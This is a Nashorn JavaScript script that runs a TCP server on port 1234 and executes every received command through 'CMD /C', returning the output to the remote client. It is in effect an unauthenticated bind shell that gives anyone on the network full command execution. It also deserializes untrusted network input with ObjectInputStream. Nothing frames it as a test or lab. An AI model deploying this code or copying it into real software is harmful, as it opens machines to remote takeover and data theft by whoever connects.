

load("nashorn:mozilla_compat.js");

importPackage(java.lang);
importPackage(java.io);
importPackage(java.net);


var server = {
    port:1234,
    maxConnections:100,
    connections:[],
    //serverSocket:new ServerSocket(1234, 100),
    start:function() {
        // ServerSocket
        this.serverSocket = new ServerSocket(this.port, this.maxConnections);
        while(true) {
            var connSocket = this.serverSocket.accept();
            //println( "Connection " + this.connections.length + " received from: " +
            //    connSocket.getInetAddress().getHostName());
            var connection = createConnection(connSocket)
            this.connections.push(connection);
        }
    }
}
Object.prototype.toString = showObject;
println('start')
server.start();

function run(command, outStream)
{
    var bytes = new java.lang.reflect.Array.newInstance(Byte.TYPE, 4096);
    try {
        var process = Runtime.getRuntime().exec("CMD /C " + command);
        var exit = process.waitFor();
        var stream = (exit == 0) ? process.getInputStream(): process.getErrorStream();
        var numRead = stream.read(bytes);
        if(numRead > 0) {
            //System.out.write(bytes, 0, numRead)
            outStream.write(bytes, 0, numRead);
            outStream.flush();
        }
    }
    catch(x) {
        println(x);
    }    
}
function createConnection(connSocket)
{
    var connection = {
        socket:connSocket,
        input:new ObjectInputStream(connSocket.getInputStream()),
        output: new ObjectOutputStream(connSocket.getOutputStream()),
        process:function() {
            this.output.flush();
            try {
                while(true) {
                    var command = this.input.readObject();
                    println(command);
                    if(command == "exit" || command == "quit") {
                        this.close();
                        return;
                    }
                    run(command, this.output)
                };
            }
            catch(x) {
                println(x);
                this.close();
            }
        },
        close:function() {
            println("connection closed");
            this.input.close();
            this.output.close();
            this.socket.close();

        }
    }
    println("connection: " + connection);
    new Thread(function() {
        println("thread started...");
        connection.process();
    }).start();
    // new Thread(new Runnable() {
    //     run:function() {
    //         println("thread started...");
    //         connection.process();
    //     }
    // }).start();
    return connection;
}

function showObject() {
    var s = "";
    for(var i in this) {
        if(typeof(this[i]) == 'function') continue;
        if(s != "") s += ",";
        if(typeof(this[i]) == 'object') s += i + ":"+ this[i].toString();
        else s += i+ ":" + this[i];
    }
    return (s == "") ? s : ("(" + s + ")" );
}

